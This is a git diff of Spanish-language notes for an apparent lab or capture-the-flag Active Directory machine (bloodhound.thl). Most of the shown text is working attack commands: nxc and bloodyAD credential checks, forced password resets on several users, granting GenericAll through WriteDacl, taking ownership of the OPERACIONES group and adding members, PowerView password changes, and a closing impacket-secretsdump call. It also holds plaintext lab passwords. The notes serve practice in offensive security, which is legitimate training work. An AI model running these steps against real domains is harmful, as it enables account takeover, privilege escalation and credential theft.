@@ -249,6 +249,15 @@ SMB                      192.168.56.4  445    ELEVATOR         1114: BLOODHOUND\
 
 
 
+┌──(kali㉿kali)-[~/Documents/Elevator]
+└─$ nxc ldap 192.168.56.4 -u 'john.smith' -p 'Rk436\#Z4&'
+
+LDAP        192.168.56.4    389    ELEVATOR         [*] Windows Server 2022 Build 20348 (name:ELEVATOR) (domain:bloodhound.thl)
+LDAP        192.168.56.4    389    ELEVATOR         [+] bloodhound.thl\john.smith:Rk436\#Z4& 
+
+
+
+
 
 
 
@@ -374,6 +383,9 @@ bloodyAD --host dc.bloodhound.thl -d bloodhound.thl -u 'john.smith' -p 'Rk436\#Z
 bloodyAD -d 'bloodhound.thl' --dc-ip 192.168.56.4 -u 'john.smith' -p 'Rk436\#Z4&' add groupMember FINANZAS john.smith
 
 
+--si vale
+bloodyAD -d bloodhound.thl --dc-ip 192.168.56.4 -u 'john.smith' -p 'Rk436\#Z4&' add groupMember FINANZAS john.smith
+
 
 
 ## Despues de agregar de Agregar
@@ -402,7 +414,9 @@ rpcclient $> queryuser 0x455
 
 - bloodyAD --host dc.bloodhound.thl -d bloodhound.thl -u 'john.smith' -p 'Rk436\#Z4&' set password MARY.JOHNSON 'Patito12345' 
 
-- bloodyAD -d 'bloodhound.thl' --dc-ip 192.168.56.4 -u 'john.smith' -p 'Rk436\#Z4&' set password mary.johnson 'Patito12345'
+--si vale
+
+- bloodyAD -d bloodhound.thl --dc-ip 192.168.56.4 -u 'john.smith' -p 'Rk436\#Z4&' set password mary.johnson 'Patito12345'
 
 
 
@@ -424,7 +438,9 @@ SMB         192.168.56.4  445    ELEVATOR         [+] bloodhound.thl\mary.johnso
 
 - net rpc password "robert.williams" "Patito12345" -U "bloodhound.thl"/"mary.johnson"%"Patito12345" -S 192.168.56.4
 
-- bloodyAD -d 'bloodhound.thl' --dc-ip 192.168.56.4 -u 'mary.johnson' -p 'Patito12345' set password ROBERT.WILLIAMS Patito12345
+--si vale
+- bloodyAD -d bloodhound.thl --dc-ip 192.168.56.4 -u 'mary.johnson' -p 'Patito12345' set password ROBERT.WILLIAMS 'Patito12345'
+
 
 
 
@@ -459,7 +475,17 @@ rpcclient $> queryuser 0x458
 ## ROBERT.WILLIAMS Posee PATRICIA.BROWN De WriteDacl Permisos
 
 - bloodyAD -d 'bloodhound.thl' --dc-ip 192.168.56.4 -u 'robert.williams' -p 'Patito12345' get writable
+
+
+## Para abusar de WriteDacl en objetos de usuario, puede darse permisos GenericAll
+--si vale
+- bloodyAD -d bloodhound.thl --dc-ip 192.168.56.4 -u 'robert.williams' -p 'Patito12345' add genericAll patricia.brown robert.williams
+
  
+ [+] ROBERT.WILLIAMS has now GenericAll on PATRICIA.BROWN
+
+
+
  ```
 distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=bloodhound,DC=thl
 permission: WRITE
@@ -472,19 +498,8 @@ DACL: WRITE
 ```
 
 
-        - impacket-dacledit -action 'write' -rights 'FullControl' -principal 'robert.williams' -target 'patricia.brown' 'bloodhound.thl/robert.williams:Patito12345'
-
-        Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
-        [*] DACL backed up to dacledit-20250905-194526.bak
-        [*] DACL modified successfully!
-                                                                                                                                                          
-                                                                                                                                                          
-## Para abusar de WriteDacl en objetos de usuario, puede darse permisos GenericAll
-
-- bloodyAD -d 'bloodhound.thl' --dc-ip 192.168.56.4 -u 'ROBERT.WILLIAMS' -p 'Patito12345' add genericAll PATRICIA.BROWN ROBERT.WILLIAMS
-
- [+] ROBERT.WILLIAMS has now GenericAll on PATRICIA.BROWN
-                              
+                                                                                               
+                                                                                                                                                                                      
 
 
 ### Vamos a cambiarle de contrasena a PATRICIA
@@ -492,7 +507,8 @@ DACL: WRITE
 - net rpc password "patricia.brown" "Patito12345" -U "bloodhound.thl"/"robert.williams"%"Patito12345" -S 192.168.56.4
 
 
-- bloodyAD -d 'bloodhound.thl' --dc-ip 192.168.56.4 -u 'ROBERT.WILLIAMS' -p 'Patito12345' set password PATRICIA.BROWN Patito12345
+- bloodyAD -d bloodhound.thl --dc-ip 192.168.56.4 -u 'robert.williams' -p 'Patito12345' set password PATRICIA.BROWN 'Patito12345'
+
 
 [+] Password changed successfully!
 
@@ -510,7 +526,8 @@ netexec smb 192.168.56.4 -u patricia.brown -p 'Patito12345'
 ------------------------------------------------------------------------------------------------------------------------------------------------
 
 
-# ADDSelf-2
+# Abuso de WriteOwner y control de grupo
+
 
 Usuarios PATRICIA.BROWN@BLOODHOUND.THL Con derecho a modificar el grupo OPERACIONES@BLOODHOUND.THL El propietario
 
@@ -538,26 +555,23 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 
 
-
+--si vale
 ### Este comando modifica la ACL del grupo OPERACIONES y le da a  patricia.brown el permiso de agregar o quitar miembros del grupo.
 
 
-- bloodyAD -d 'bloodhound.thl' --dc-ip 192.168.56.4 -u 'PATRICIA.BROWN' -p 'Patito12345' set owner OPERACIONES PATRICIA.BROWN
-
-        - dacledit.py -action 'write' -rights 'WriteMembers' -principal 'PATRICIA.BROWN' -target-dn 'CN=OPERACIONES,OU=OPERACIONES,DC=BLOODHOUND,DC=THL' 'bloodhound.thl'/'PATRICIA.BROWN':'Patito12345'
-
-       - impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'PATRICIA.BROWN' -target-dn 'CN=OPERACIONES,OU=OPERACIONES,DC=BLOODHOUND,DC=THL' 'bloodhound.thl'/'PATRICIA.BROWN':'Patito12345'
+- bloodyAD -d bloodhound.thl --dc-ip 192.168.56.4 -u 'patricia.brown' -p 'Patito12345' set owner OPERACIONES patricia.brown
 
 
+- impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'patricia.brown' -target-dn 'CN=OPERACIONES,OU=OPERACIONES,DC=BLOODHOUND,DC=THL' 'bloodhound.thl'/'PATRICIA.BROWN':'Patito12345'
 
-- bloodyAD -d 'bloodhound.thl' --dc-ip 192.168.56.4 -u 'PATRICIA.BROWN' -p 'Patito12345' add groupMember OPERACIONES PATRICIA.BROWN
+----
+
+
+## Al ser propietarios, ajustamos la DACL del grupo y nos añadimos como miembros.
 
 
 
-
-## Aplicar cambios de contraseña
-
-bloodyAD -d 'bloodhound.thl' --dc-ip 192.168.56.4 -u 'PATRICIA.BROWN' -p 'Patito12345' set password MICHAEL.JONES admin12345
+bloodyAD -d bloodhound.thl --dc-ip 192.168.56.4 -u 'patricia.brown' -p 'Patito12345' add groupMember OPERACIONES patricia.brown
 
 
 
@@ -565,9 +579,13 @@ bloodyAD -d 'bloodhound.thl' --dc-ip 192.168.56.4 -u 'PATRICIA.BROWN' -p 'Patito
 
 
 
-bloodyAD -d 'bloodhound.thl' --dc-ip 192.168.56.4 -u 'MICHAEL.JONES' -p 'Patito12345' add groupMember 'Usuarios de administración remota' MICHAEL.JONES
+# Acceso a usuario privilegiado
 
 
+
+
+
+bloodyAD -d bloodhound.thl --dc-ip 192.168.56.4 -u 'patricia.brown' -p 'Patito12345' set password michael.jones 'Patito12345'
 
 
 
@@ -629,3 +647,36 @@ axxxxxxxxxxxxxxxxxxxxxxxxxxx6
 bxxxxxxxxxxxxxxxxxxxxxxxxxxxe
 Resume
 ¿Genial?
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Set-DomainUserPassword -Identity "mary.johnson" -AccountPassword "Rk436\#Z4&"
+
+powerview bloodhound.thl/mary.johnson:'Patito12345'@192.168.56.4
+
+powerview bloodhound.thl/robert.williams:'Patito12345'@192.168.56.4
+
+
+Set-DomainUserPassword -Identity "patricia.brown" -AccountPassword "Patito12345"
+
+
+
+powerview bloodhound.thl/patricia.brown:'Patito12345'@192.168.56.4
+
+
+
+ Set-DomainUserPassword -Identity "michael.jones" -AccountPassword "Patito12345"
+
+
+ impacket-secretsdump bloodhound.thl/michael.jones:'<RECORTADO>'@10.0.250.3
